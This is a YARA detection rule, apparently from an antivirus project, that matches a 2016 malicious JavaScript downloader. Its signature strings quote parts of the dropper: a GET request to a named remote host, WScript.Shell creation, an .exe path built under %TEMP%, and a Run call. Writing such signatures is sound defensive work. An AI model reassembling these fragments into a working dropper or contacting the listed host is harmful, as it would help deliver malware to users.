rule sig_20160330_f28f19d64c6a3922d17517fbe56f628e {
  meta:
    description = "datamaliciousorder - file 20160330_f28f19d64c6a3922d17517fbe56f628e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6c55525078d845baca49874801fd4e93df99e30902a6779ec524ae9ab09658da"

  strings:
    $s1  = "EQ[G](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "function FF(IG, RM){RA = RA * 1; return IG - RM;};" fullword ascii
    $s3  = "var E0 = function VW() {return WScript[D](\"WScript\"+\".Shell\");}(), O = 11;" fullword ascii
    $s4  = "if (EQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GO() {return E0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"GZ0D5zAYRT8w7HQI.ex\" + \"e\";};" fullword ascii
    $s6  = "function OE(){return I1 + \"\";};" fullword ascii
    $s7  = "function QJ() {return ((UN == true) && (UN == C)) ? 1 : RA;};" fullword ascii
    $s8  = "function ON(IL){E0[\"Run\"](IL, RA, RA);};" fullword ascii
    $s9  = "var H = new this[\"Date\"]();" fullword ascii
    $s10 = "function FL(){return 22;};" fullword ascii
    $s11 = "function M(GO0) {var A = (1, 2, 3, 4, 5, GO0); return A;};" fullword ascii
    $s12 = "function S(){return D;};" fullword ascii
    $s13 = "}while (F);" fullword ascii
    $s14 = "function US()" fullword ascii
    $s15 = "return FF(SI, E);" fullword ascii
    $s16 = "var C = false;" fullword ascii
    $s17 = "C = true; " fullword ascii
    $s18 = "UN = true; " fullword ascii
    $s19 = "var KA = false;" fullword ascii
    $s20 = "var UN = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}